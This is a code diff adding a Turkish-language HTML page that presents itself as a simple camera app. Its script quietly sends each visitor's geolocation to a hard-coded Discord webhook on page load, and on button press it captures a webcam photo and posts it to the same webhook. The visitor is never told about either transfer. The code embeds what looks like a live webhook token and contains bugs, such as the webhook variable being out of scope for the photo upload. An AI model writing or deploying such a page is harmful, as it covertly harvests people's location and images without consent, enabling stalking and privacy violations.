@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Kamera Erişimi</title>
+  </head>
+  <body>
+    <h1>Kamera Erişimi</h1>
+    <button id="take-picture">Resim Çek</button>
+    <div id="picture-container"></div>
+
+    <script>
+      const takePictureButton = document.getElementById('take-picture');
+      const pictureContainer = document.getElementById('picture-container');
+
+      // Request the user's location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // Send the user's location to the Discord webhook
+          const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
+          const formData = new FormData();
+          formData.append('content', `Siteye Girildi: ${lat}, ${lon}`);
+
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
+          })
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch(error => console.error(error));
+        });
+      } else {
+        console.error('Geolocation is not supported by this browser.');
+      }
+
+      takePictureButton.addEventListener('click', async () => {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const imageData = canvas.toDataURL('image/jpeg');
+          const image = document.createElement('img');
+          image.src = imageData;
+          pictureContainer.appendChild(image);
+
+          // Send the image to the Discord webhook
+          const formData = new FormData();
+          formData.append('file', imageData);
+          formData.append('username', 'Kamera Erişimi');
+          formData.append('content', 'Resim Çekildi!');
+
+          fetch(webhookUrl, {
+            method: 'POST',
+            body: formData,
+          })
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch(error => console.error(error));
+        } catch (error) {
+          console.error('Error:', error);
+        }
+      });
+    </script>
+  </body>
+</html>
